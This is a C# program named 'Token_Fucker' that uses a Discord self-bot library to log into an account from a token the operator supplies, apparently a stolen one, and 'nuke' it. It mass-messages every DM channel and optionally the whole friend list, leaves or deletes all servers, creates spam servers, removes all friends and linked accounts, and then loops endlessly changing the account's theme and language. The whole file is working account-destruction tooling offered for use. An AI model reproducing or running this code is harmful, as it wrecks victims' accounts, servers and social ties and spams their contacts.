using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Drawing;
using Discord;
using Discord.Gateway;
using System.Net;

namespace Token_Fucker
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("Enter a token to be fucked: ");
            string token = Console.ReadLine();
            DiscordSocketClient client = new DiscordSocketClient(new DiscordSocketConfig() { ApiVersion = 7 });
            client.OnLoggedIn += Client_OnLoggedIn;
            try
            {
                client.Login(token);
            } catch (Discord.InvalidTokenException)
            {
                Console.WriteLine("Invalid token passed.");
            }
            Thread.Sleep(-1);
        }
        private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            Console.WriteLine("Started client, nuking.");
            Console.Write("What do you want the servers to be named to? > ");
            string guildname = Console.ReadLine();
            Console.Write("What do you want to set the custom status to? > ");
            string status = Console.ReadLine();
            Console.Write("What do you want to send to everyone in the DM list. > ");
            string dmmessage = Console.ReadLine();
            Console.Write("Do you want to open dms with entire friend list? y/n [This can get the acc phone locked/disabled] > ");
            string opendms = Console.ReadLine();

            var guilds = client.GetGuilds();
            var friends = client.GetRelationships();
            var connections = client.GetConnectedAccounts();

            // Open dms with entire friend list.
            if (opendms == "y")
            {
                foreach (var friendids in friends)
                {
                    client.CreateDM(friendids.User.Id);
                }
            }

            // DM entire DM list
            var directmessages = client.GetPrivateChannels();
            foreach (var cid in directmessages)
            {
                client.SendMessage(cid.Id, dmmessage);
                Console.WriteLine("Sent a message to channel id [DMs] " + cid.Id);
                Thread.Sleep(500);
            }

            // Set custom status
            client.User.ChangeSettings(new UserSettingsProperties()
            {
                Theme = DiscordTheme.Light,
                DeveloperMode = true,
                Language = DiscordLanguage.Korean,
                CustomStatus = new CustomStatus()
                {
                    Text = status
                }
            });

            // Leave/delete every guild.
            foreach (var guildids in guilds)
            {
                try
                {
                    client.LeaveGuild(guildids.Id);
                    Console.WriteLine("Left Guild " + guildids.Id);
                }
                catch
                {
                    try
                    {
                        client.DeleteGuild(guildids.Id);
                        Console.WriteLine("Deleted Guild " + guildids.Id);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Could not delete a guild, possibly cuz of 2FA Error: " + ex);
                    }
                }
            }

            // Mass Create Guilds
            using (WebClient webClient = new WebClient())
                webClient.DownloadFile("https://gblobscdn.gitbook.com/spaces%2F-M9yNp3uGfRW04W_P6dE%2Favatar-1592659338854.png", "anarchy.png");
            for (int amount = 0; amount < 3; amount++)
            {
                client.CreateGuild(guildname, (DiscordImage)Image.FromFile("anarchy.png"), "europe");
                Console.WriteLine("Created a guild.");
            }

            // Remove all friends.
            foreach (var friendids in friends)
            {
                client.RemoveRelationship(friendids.User.Id);
                Console.WriteLine("Removed relationship with ID " + friendids.User.Id);
            }

            // Remove all connections.
            
            foreach (var connectionlist in connections)
            {
                client.RemoveConnectedAccount(connectionlist.Type, connectionlist.Id);
                Console.WriteLine("Removed connection " + connectionlist.Type + " with the id of" + connectionlist.Id + ".");
            }

            // Spam switch through dark and white mode, and rapidly change the language of the user's account.
            Console.WriteLine("Rapidly changing through dark and white mode, and random languages.");
            while (true)
            {
                try
                {
                    var values = Enum.GetValues(typeof(DiscordLanguage)).Cast<DiscordLanguage>();
                    foreach (var value in values)
                    {
                        client.User.ChangeSettings(new UserSettingsProperties
                        {
                            Theme = DiscordTheme.Dark,
                            Language = value
                        });
                        client.User.ChangeSettings(new UserSettingsProperties
                        {
                            Theme = DiscordTheme.Light,
                            Language = value
                        });
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: " + ex);
                }
            }
        }
    }
}
